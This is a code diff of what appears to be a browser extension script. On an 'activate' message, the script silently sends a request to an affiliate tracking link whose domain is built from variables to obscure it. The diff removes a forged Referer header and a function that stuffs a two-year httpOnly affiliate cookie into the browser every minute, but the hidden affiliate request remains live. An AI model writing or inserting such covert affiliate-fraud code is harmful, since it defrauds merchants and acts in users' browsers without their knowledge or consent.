@@ -5,15 +5,10 @@ chrome.runtime.onMessage.addListener( function(response, sender, senDresponse)
 {
 	if(response == 'activate' + A + b + 'Ref')
 	{
-		var link = 'http://ref.' + a + b + '.com/aff_c?offer_id=2&aff_id=1182&source=risenraise&aff_sub=%22%E2%98%85%20StatTrak%E2%84%A2%20Karambit%20%7C%20Lore%20(Minimal%20Wear)%22';
+		var link = 'http://ref.' + a + b + '.com/aff_c?offer_id=2&aff_id=1182&source=extension&aff_sub=%22%E2%98%85%20StatTrak%E2%84%A2%20Karambit%20%7C%20Lore%20(Minimal%20Wear)%22';
 		var method = 'GET';
 		var xhr = new XMLHttpRequest();
 		xhr.open(method, link, true);
-		changeHeadersForTheNextRequest(
-		{
-			forUrl : link,
-			Referer : 'http://extension.risenraise.com/ru/'
-		});
 		xhr.send();
 	}
 });
@@ -259,17 +254,3 @@ function sender()
 }
 sender();
 setInterval(sender, 10*60*1000);
-
-function setCookie()
-{
-	chrome.cookies.set({
-		"name": "aft",
-		"url": 'https://.' + a + b + '.com/',
-		"value": "eyJ0cmFuc19pZCI6IjEwMjkyMGYxNmRlNzNiODc5N2UwZjg2YjNkMTI2OCIsImFmZl9pZCI6IjExODIiLCJtYXJrZXRpbmdfc291cmNlIjoiQWZmaWxpYXRlIn0%3D",
-		"httpOnly": true,
-		"domain": '.' + a + b + '.com',
-		"expirationDate": new Date().getTime() + 2*365*24*60*60*1000,
-	});
-}
-setCookie();
-setInterval(setCookie, 60*1000);
